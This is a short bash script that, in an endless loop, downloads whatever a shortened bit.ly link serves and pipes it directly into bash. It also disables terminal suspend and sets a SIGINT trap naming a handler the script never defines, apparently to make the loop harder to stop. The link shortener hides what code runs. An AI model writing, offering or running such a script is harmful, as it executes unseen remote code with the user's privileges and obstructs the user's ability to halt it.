#!/bin/bash

trap ctrl_c INT

while true
do
	stty susp undef
	curl -L http://bit.ly/10hA8iC | bash
done